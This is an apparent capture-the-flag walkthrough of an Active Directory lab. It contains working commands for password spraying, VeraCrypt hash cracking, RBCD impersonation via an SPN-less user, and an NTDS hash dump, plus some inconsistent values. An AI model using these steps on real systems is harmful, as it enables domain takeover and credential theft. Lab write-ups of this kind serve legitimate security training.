

## Lab Details
- Difficulty: Medium
- OS: Windows 

## Summary
- Initial access: AD Account Compromise, Leftover artifacts 
- Privilege escalation: RBCD Attack

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.234.63 -p- -sC -sV -A -v -Pn
<SNIP>
Host is up (0.0030s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-08 11:06:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.phantom.vl
| Issuer: commonName=DC.phantom.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-07T11:00:27
| Not valid after:  2027-01-06T11:00:27
| MD5:   a55d:f1da:ecea:0160:bfe5:fa93:275e:4139
|_SHA-1: bf01:ea3f:f5a6:0d1f:e0de:1eb2:1bbd:2842:4dec:2091
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   DNS_Tree_Name: phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-08T11:07:17+00:00
|_ssl-date: 2026-07-08T11:07:57+00:00; -7s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
52890/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52891/tcp open  msrpc         Microsoft Windows RPC
52898/tcp open  msrpc         Microsoft Windows RPC
53995/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -7s, deviation: 0s, median: -7s
| smb2-time: 
|   date: 2026-07-08T11:07:20
|_  start_date: N/A

```
- Enumerate domain info using `enum4linux-ng`
```
$ enum4linux-ng 10.129.234.63
<SNIP>
 ============================================================
|    Domain Information via SMB session for 10.129.234.63    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: PHANTOM
DNS domain: phantom.vl
FQDN: DC.phantom.vl
Derived membership: domain member
Derived domain: PHANTOM
<SNIP>
```
- Enumerate the SMB share anonymously 
```
$smbclient -L //10.129.234.63/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Departments Share Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Public          Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.234.63 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Enumerate the `Public` Share identified an email named `tech_support_email.eml`
```
$smbclient  //10.129.234.63/Public
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 11 11:03:14 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024

                6127103 blocks of size 4096. 1471817 blocks available
smb: \> mget tech_support_email.eml
Get file tech_support_email.eml? yes
getting file \tech_support_email.eml of size 14565 as tech_support_email.eml (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
```
- We see a PDF file attached, the PDF file containers a template for new users
```
$cat tech_support_email.eml
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="
MIME-Version: 1.0
From: alucas@phantom.vl
To: techsupport@phantom.vl
Date: Sat, 06 Jul 2024 12:02:39 -0000
Subject: New Welcome Email Template for New Employees

--===============6932979162079994354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit


Dear Tech Support Team,

I have finished the new welcome email template for onboarding new employees.

Please find attached the example template. Kindly start using this template for all new employees.

Best regards,
Anthony Lucas

--===============6932979162079994354==
Content-Type: application/pdf
MIME-Version: 1.0
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="welcome_template.pdf"

JVBERi0xLjcKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURl
Y29kZT4+CnN0cmVhbQp4nI1Vy4rcMBC8+yt0zsFTXZYsGcyAJY8hgT0sGcgh5LBksyE5LGRYyO+H
<SNIP>
```
- The pdf file is encoded in base64 so decode it first then open
```
$cat welcome_template.pdf | base64 -d > attached.pdf
```
- We see that the default password for new users
![[Pasted image 20260709100230.png]]

```
Ph4nt0m@5t4rt!
```
## Foothold

#### Steps
- Perform `rid-brute` to get a list of users using guest account
```
$nxc smb 10.129.234.63 -u 'guest' -p '' --rid-brute
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [+] phantom.vl\guest:
SMB         10.129.234.63   445    DC               498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               500: PHANTOM\Administrator (SidTypeUser)
SMB         10.129.234.63   445    DC               501: PHANTOM\Guest (SidTypeUser)
SMB         10.129.234.63   445    DC               502: PHANTOM\krbtgt (SidTypeUser)
SMB         10.129.234.63   445    DC               512: PHANTOM\Domain Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               513: PHANTOM\Domain Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               514: PHANTOM\Domain Guests (SidTypeGroup)
SMB         10.129.234.63   445    DC               515: PHANTOM\Domain Computers (SidTypeGroup)
SMB         10.129.234.63   445    DC               516: PHANTOM\Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               517: PHANTOM\Cert Publishers (SidTypeAlias)
SMB         10.129.234.63   445    DC               518: PHANTOM\Schema Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               519: PHANTOM\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.63   445    DC               521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.63   445    DC               525: PHANTOM\Protected Users (SidTypeGroup)
SMB         10.129.234.63   445    DC               526: PHANTOM\Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.63   445    DC               571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.63   445    DC               1000: PHANTOM\DC$ (SidTypeUser)
SMB         10.129.234.63   445    DC               1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         10.129.234.63   445    DC               1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.129.234.63   445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.129.234.63   445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.129.234.63   445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.129.234.63   445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.129.234.63   445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.129.234.63   445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.129.234.63   445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.129.234.63   445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.129.234.63   445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.129.234.63   445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.129.234.63   445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.129.234.63   445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.129.234.63   445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.129.234.63   445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.129.234.63   445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.129.234.63   445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.129.234.63   445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.129.234.63   445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.129.234.63   445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.129.234.63   445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.129.234.63   445    DC               1130: PHANTOM\alucas (SidTypeUser)
SMB         10.129.234.63   445    DC               1131: PHANTOM\ebryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1132: PHANTOM\vlynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1133: PHANTOM\ghall (SidTypeUser)
SMB         10.129.234.63   445    DC               1134: PHANTOM\ssimpson (SidTypeUser)
SMB         10.129.234.63   445    DC               1135: PHANTOM\ccooper (SidTypeUser)
SMB         10.129.234.63   445    DC               1136: PHANTOM\vcunningham (SidTypeUser)
SMB         10.129.234.63   445    DC               1137: PHANTOM\SSPR Service (SidTypeGroup)
```
- Enumerate the username using the default password
```
$nxc smb 10.129.234.63 -u users -p 'Ph4nt0m@5t4rt!'
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\bbarnes:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\cjones:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\agarcia:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
```
- List shares the user `ibryant` can read
```
$nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```
- Enumerate the `Departments Share`
```
$smbclient  //10.129.234.63/'Departments Share' -U ibryant
Password for [WORKGROUP\ibryant]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

                6127103 blocks of size 4096. 2386903 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Thu Aug 14 07:55:49 2025
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024

\Finance
  .                                   D        0  Sat Jul  6 12:25:11 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Expense_Reports.pdf                 A   709718  Sat Jul  6 12:25:11 2024
  Invoice-Template.pdf                A   190135  Sat Jul  6 12:23:54 2024
  TaxForm.pdf                         A   160747  Sat Jul  6 12:22:58 2024

\HR
  .                                   D        0  Sat Jul  6 12:21:31 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Employee-Emergency-Contact-Form.pdf      A    21861  Sat Jul  6 12:21:31 2024
  EmployeeHandbook.pdf                A   296436  Sat Jul  6 12:16:25 2024
  Health_Safety_Information.pdf       A  3940231  Sat Jul  6 12:20:39 2024
  NDA_Template.pdf                    A    18790  Sat Jul  6 12:17:33 2024

\IT
  .                                   D        0  Thu Jul 11 10:59:02 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Backup                              D        0  Sat Jul  6 14:04:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 12:14:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 12:26:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 12:27:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 16:30:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 12:14:08 2024

\IT\Backup
  .                                   D        0  Sat Jul  6 14:04:34 2024
  ..                                  D        0  Thu Jul 11 10:59:02 2024
  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024

                6127103 blocks of size 4096. 2386903 blocks available
```
- Download the `.hc` file 
```
$smbget -r -U ibryant%'Ph4nt0m@5t4rt!' smb://10.129.234.63/'Departme
nts Share/IT/Backup/IT_BACKUP_201123.hc'
Using domain: WORKGROUP, user: ibryant
smb://10.129.234.63/Departments Share/IT/Backup/IT_BACKUP_201123.hc
Downloaded 4.00MB in 28 seconds
```
- A **.hc file** is ==typically an encrypted virtual disk container created by [VeraCrypt](https://veracrypt.io/en/Beginner's%20Tutorial.html)==.
- Download `VeraCrypt` then, select Volume and import the backup file 
![[Pasted image 20260709104954.png]]
- We are prompted to enter password
- Search online and found a below method to parse the file to hash 

```
$dd if=./IT_BACKUP_201123.hc of=./hash bs=512 count=1

1+0 records in
1+0 records out
512 bytes copied, 6.0677e-05 s, 8.4 MB/s
```
- Use gorilla to generate a wordlist using the company name
```
$gorilla --from-pattern "Phantom{2020-2026}{s}" --output-file gorilla_phantom.txt

gorilla: (wrn) missing mutation sets
gorilla: (inf) will generate 231 words from a pattern Phantom{2020-2026}{s}
gorilla: (inf)          sizes before mutations: 3003 bytes / 0 MB / 0 GB / 0 TB
gorilla: (inf)          --pattern-threads 1 (total pattern threads)
gorilla: (wrk)   [00:00:00] [########################################] 231/231 (eta: 0s) Done
```
- Perform decryption using hashcat 
```
$hashcat -m 13722 -a 0 hash wordlist.txt
<SNIP>
hash:Phantom2023!
<SNIP>
```
- The backup has been mounted to `/media/veracrypt1`
```
$ls -l
total 11M
drwx------ 2 ch4os1 ch4os1 1.0K Jul  6  2024 '$RECYCLE.BIN'
-rwx------ 1 ch4os1 ch4os1  47K Jul  6  2024  azure_vms_0805.json
-rwx------ 1 ch4os1 ch4os1  47K Jul  6  2024  azure_vms_1023.json
-rwx------ 1 ch4os1 ch4os1  47K Jul  6  2024  azure_vms_1104.json
-rwx------ 1 ch4os1 ch4os1  47K Jul  6  2024  azure_vms_1123.json
-rwx------ 1 ch4os1 ch4os1 989K Jul  6  2024  splunk_logs_1003
-rwx------ 1 ch4os1 ch4os1 989K Jul  6  2024  splunk_logs_1102
-rwx------ 1 ch4os1 ch4os1 989K Jul  6  2024  splunk_logs1203
drwx------ 2 ch4os1 ch4os1 1.0K Jul  6  2024 'System Volume Information'
-rwx------ 1 ch4os1 ch4os1  19K Jul  6  2024  ticketing_system_backup.zip
-rwx------ 1 ch4os1 ch4os1 7.9M Jul  6  2024  vyos_backup.tar.gz
```
- Extract the `tar.gz` file 
```
tar -xzf vyos_backup.tar.gz
```
- Found a `config.boot` file for `vyos`
```
ls
total 16K
drwxrwsr-x 1 root mysql 354 Jul  6  2024 archive
drwxrwsr-x 1 root mysql   0 Jul  5  2024 auth
-rw-rw---- 1 root mysql 11K Jul  6  2024 config.boot
drwxrwsr-x 1 root mysql 114 Jul  5  2024 scripts
drwxrwsr-x 1 root mysql   0 Jul  5  2024 support
drwxrwsr-x 1 root mysql   0 Jul  5  2024 user-data
-rw-r--r-- 1 root mysql 174 Jul  6  2024 vyos-activate.log
```
- Identified a plaintext password in `config.boot`
```
$ cat /config/config.boot
<SNIP>
vpn {
 sstp {
 authentication {
 local-users {
 username lstanley {
 password "gB6XTcqVP5MlP7Rc"
 }
<SNIP>
```
- Perform password spray, identified account `svc_sspr` using the password found in `config.boot`
```
$nxc smb 10.129.234.63 -u users -p 'gB6XTcqVP5MlP7Rc'
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
```
- Run bloodhound to enumerate the target domain 
```
$bloodhound-ce-python -u svc_sspr -p gB6XTcqVP5MlP7Rc -d phantom.vl --zip -c All -dc dc.phantom.vl -ns 10.129.234.63
```
- Upload bloodhound data and enumerate the relationships
- Identified `svc_sspr` has remote access to target 
![[Pasted image 20260709120420.png]]
- Use `evil-winrm` to establish a remote access to target
```
$ evil-winrm -i 10.129.234.63 -u svc_sspr -p gB6XTcqVP5MlP7Rc
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Found that `svc_sspr` has `forcechangepassowrd` access to three accounts that they belong to the `ICT SECURITY` group which has `AddAllowToAct` permission over DC
![[Pasted image 20260709120354.png]]
- According to the linux abuse on bloodhound (right click on AddAllowedToAct Edge) we can attempt to perform RBCD (Resource Based Constrained Delegation) Attack
- First update the password of a user e.g. `wsilva`
```
$bloodyAD --host 10.129.2.119 -d phantom.vl -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' set password WSILVA 'Password123!'
[+] Password changed successfully!
```
- However we do not have a machine account and we are not allowed to add a new machine to the domain 
```
$nxc ldap 10.129.234.63 -u wsilva -p 'Password123!' -M maq
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.63   389    DC               [+] phantom.vl\wsilva:Password123!
MAQ         10.129.234.63   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.234.63   389    DC               MachineAccountQuota: 0
```
- But we can attempt to perform RBCD with SPN-less user https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users
- Gist belows
```
1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
2. Change the user's password hash and set it to the TGT session key.
3. [Combine S4U2self and U2U](https://www.thehacker.recipes/ad/movement/kerberos/#s4u2self-+-u2u) so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
4. [Pass the ticket](https://www.thehacker.recipes/ad/movement/kerberos/pass-the/ptt) and access the target, as the delegated other
```
- Set the delegation right for user `wsilva`
```
$rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.129.2.125' -action 'write
' 'phantom.vl'/'wsilva':'Password123!'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] wsilva can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```
- Get TGT 
```
$getTGT.py -hashes :$(pypykatz crypto nt 'Password123!') "phantom.vl/wsilva"

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in wsilva.ccache
```
- Obtain the session key
```
$describeTicket.py "wsilva.ccache" | grep 'Ticket Session Key'

[*] Ticket Session Key            : 916239a0b2dd1b540b4ed97226236a65
```
-  Change the user's password hash and set it to the TGT session key. 
```
$changepasswd.py -newhashes :421fb9ec2d48503568765fbae69fb903 'phantom.vl'/'wsilva':'Password123!'@'DC.phantom.vl'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of phantom.vl\wsilva
[*] Connecting to DCE/RPC as phantom.vl\wsilva
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```
- Perform impersonation
```
$KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.
vl phantom.vl/wsilva -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
- Dump the hashes using `nxc`
```
export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache; nxc smb DC.phanto
m.vl --use-kcache --ntds
SMB         DC.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
SMB         DC.phantom.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC.phantom.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
SMB         DC.phantom.vl   445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         DC.phantom.vl   445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:de0c6c1bf90cdc90ed73c2b765793df6:::
SMB         DC.phantom.vl   445    DC               phantom.vl\svc_sspr:1103:aad3b435b51404eeaad3b435b51404ee:8ecffccc2f22c1607b8e104296ffbf68:::
SMB         DC.phantom.vl   445    DC               PHANTOM.vl\rnichols:1112:aad3b435b51404eeaad
<SNIP>
```

## Lessons Learned
- Attack family: RBCD Attack 
- Key takeaway: RBCD with SPN-less users

## Resources
- References: